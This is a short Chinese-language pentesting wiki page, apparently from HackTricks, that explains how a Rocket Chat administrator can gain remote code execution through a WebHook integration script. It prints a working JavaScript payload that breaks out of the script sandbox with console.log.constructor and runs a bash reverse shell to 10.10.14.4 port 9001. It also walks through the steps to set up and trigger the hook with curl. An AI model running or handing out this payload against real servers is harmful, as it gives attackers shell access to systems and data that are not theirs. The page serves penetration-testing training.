# Rocket Chat

{{#include ../../banners/hacktricks-training.md}}

## RCE

如果你是 Rocket Chat 的管理员，你可以获得 RCE。

- 转到 **`Integrations`**，选择 **`New Integration`**，并选择任意：**`Incoming WebHook`** 或 **`Outgoing WebHook`**。
- `/admin/integrations/incoming`

<figure><img src="../../images/image (266).png" alt=""><figcaption></figcaption></figure>

- 根据 [docs](https://docs.rocket.chat/guides/administration/admin-panel/integrations)，两者都使用 ES2015 / ECMAScript 6 ([基本上是 JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c)) 来处理数据。所以让我们获取一个 [rev shell for javascript](../../generic-hacking/reverse-shells/linux.md#nodejs)，例如：
```javascript
const require = console.log.constructor("return process.mainModule.require")()
const { exec } = require("child_process")
exec("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'")
```
- 配置 WebHook（频道和以用户名发布必须存在）：

<figure><img src="../../images/image (905).png" alt=""><figcaption></figcaption></figure>

- 配置 WebHook 脚本：

<figure><img src="../../images/image (572).png" alt=""><figcaption></figcaption></figure>

- 保存更改
- 获取生成的 WebHook URL：

<figure><img src="../../images/image (937).png" alt=""><figcaption></figcaption></figure>

- 使用 curl 调用它，你应该收到 rev shell


{{#include ../../banners/hacktricks-training.md}}
